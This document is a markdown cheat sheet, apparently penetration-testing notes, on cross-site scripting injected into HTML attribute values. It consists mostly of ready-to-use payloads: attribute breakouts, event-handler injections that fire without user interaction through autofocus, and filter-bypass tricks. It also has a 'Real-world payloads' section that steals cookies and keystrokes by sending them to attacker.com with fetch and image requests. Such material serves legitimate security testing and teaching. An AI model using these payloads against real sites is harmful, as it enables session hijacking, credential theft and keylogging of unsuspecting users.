# XSS — Attribute Context Injection

## What it is

Your input lands inside an existing HTML attribute value instead of the HTML body:

```html
<input value="YOUR_INPUT">
<input placeholder="YOUR_INPUT">
<img alt="YOUR_INPUT">
<a href="https://site.com?q=YOUR_INPUT">
```

Raw tag injection (`<script>alert(1)</script>`) doesn't work here — the browser treats it as a string. You need to break out of the attribute first, or stay inside the tag and abuse event handlers.

---

## Where to look

Any place where your input is reflected back inside a tag attribute:

- Search bars → `<input value="YOUR_SEARCH">`
- Profile fields (username, bio, display name) → `<span title="YOUR_NAME">`
- Error messages → `<input placeholder="Invalid: YOUR_INPUT">`
- Redirect/return URLs → `<a href="YOUR_URL">`
- Image alt/title text → `<img alt="YOUR_INPUT">`
- Hidden form fields → `<input type="hidden" value="YOUR_INPUT">`
- `data-*` attributes → `<div data-user="YOUR_INPUT">`

**How to spot it in Burp:** Send a unique string, search the response. If it appears inside a tag attribute (`="`), you're in attribute context.

---

## Two approaches depending on what's filtered

### Approach 1 — Break out of the attribute and tag, inject new tags

Use when `"` is not filtered and `<`/`>` are not encoded.

**Escape sequence:** `">`

```html
<!-- Before injection -->
<input value="YOUR_INPUT">

<!-- After injection: "><script>alert(1)</script> -->
<input value=""><script>alert(1)</script>">
```

The trailing `">` is harmless — browsers silently discard malformed HTML.

**Other tag options after breaking out:**
```html
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"><body onload=alert(1)>
```

---

### Approach 2 — Stay inside the tag, inject an event handler

Use when `<` and `>` are HTML-encoded (angle bracket encoding blocks new tag injection).

You don't need to leave the tag. Just close the attribute and add a new one:

```html
<!-- Before injection -->
<input value="YOUR_INPUT">

<!-- After injection: " onmouseover="alert(1) -->
<input value="" onmouseover="alert(1)">
```

**The app never imagined you'd inject attributes — it only encoded `<` and `>`.**

---

## Event handler reference (choose based on element type)

| Event | Fires when | Works on |
|-------|-----------|----------|
| `onfocus` | Element receives focus | input, select, textarea, a |
| `onblur` | Element loses focus | input, select, textarea |
| `onmouseover` | Mouse moves over element | any |
| `onclick` | Element is clicked | any |
| `oninput` | User types in field | input, textarea |
| `onchange` | Value changes + focus lost | input, select |
| `onkeydown` | Key pressed | input, textarea |
| `onload` | Element finishes loading | body, img, iframe, script |
| `onerror` | Element fails to load | img, script, video, audio |

---

## Auto-trigger without user interaction

Pair `autofocus` with `onfocus` to fire on page load — no user click required:

```html
" autofocus onfocus="alert(1)
```

Result:
```html
<input value="" autofocus onfocus="alert(1)">
```

Browser loads the page → auto-focuses the input → `onfocus` fires immediately.

**Also works on:** `<select autofocus onfocus=alert(1)>`, `<textarea autofocus onfocus=alert(1)>`

---

## Single-quoted attributes

If the app uses single quotes instead of double:

```html
<input value='YOUR_INPUT'>
```

Escape with `'` instead:

```html
' autofocus onfocus='alert(1)
' onmouseover='alert(1)
'><script>alert(1)</script>
```

---

## Unquoted attributes

Sometimes attributes have no quotes at all:

```html
<input value=YOUR_INPUT>
```

Any whitespace ends the attribute — so you don't even need a quote to escape:

```html
x onfocus=alert(1) autofocus
```

Result:
```html
<input value=x onfocus=alert(1) autofocus>
```

---

## Real-world payloads (beyond alert)

```html
<!-- Steal cookie via onfocus — no user click needed -->
" autofocus onfocus="fetch('https://attacker.com/?c='+document.cookie)

<!-- Steal cookie on mouseover — works anywhere -->
" onmouseover="new Image().src='https://attacker.com/?c='+document.cookie

<!-- Redirect on click -->
" onclick="window.location='https://attacker.com'

<!-- Keylogger injected via attribute -->
" onfocus="document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)} autofocus "
```

---

## Bypasses when event handlers are filtered

| Filter | Bypass |
|--------|--------|
| Blocks `onerror`, `onfocus` etc | Try less common: `onpointerover`, `ontoggle`, `onanimationstart` |
| Blocks `alert` | `confirm(1)`, `prompt(1)`, `console.log(1)` |
| Blocks `(` and `)` | `` alert`1` `` (template literal — no parens needed) |
| Blocks `=` in attribute value | Try HTML entities: `&#x3D;` |
| Strips `on*` attributes | Try `<details ontoggle=alert(1) open>` — fires on open |
| Blocks known events | `onpointerrawupdate`, `onbeforeinput`, `onsecuritypolicyviolation` |

**`<details ontoggle>` trick** — works even when injecting into body context, fires without click if `open` attribute is present:
```html
"><details open ontoggle=alert(1)>
```

---

## Encoding reference

When delivering via URL or in contexts requiring encoding:

| Char | HTML entity | URL encoded |
|------|------------|-------------|
| `"` | `&quot;` | `%22` |
| `'` | `&apos;` / `&#x27;` | `%27` |
| `<` | `&lt;` | `%3C` |
| `>` | `&gt;` | `%3E` |
| `(` | `&#x28;` | `%28` |
| `)` | `&#x29;` | `%29` |
| `=` | `&#x3D;` | `%3D` |

---

## Decision tree

```
Input reflected in attribute?
│
├── Are < and > encoded?
│   ├── NO  → Break out with "> then inject tag/script
│   └── YES → Stay in tag, inject event handler attribute
│
├── Are quotes filtered?
│   ├── NO quotes used in attribute → inject with whitespace only
│   └── Single quotes used → escape with '
│
└── Are on* handlers filtered?
    ├── Try less common events (onpointerover, ontoggle, onanimationstart)
    └── Try <details open ontoggle=alert(1)>
```
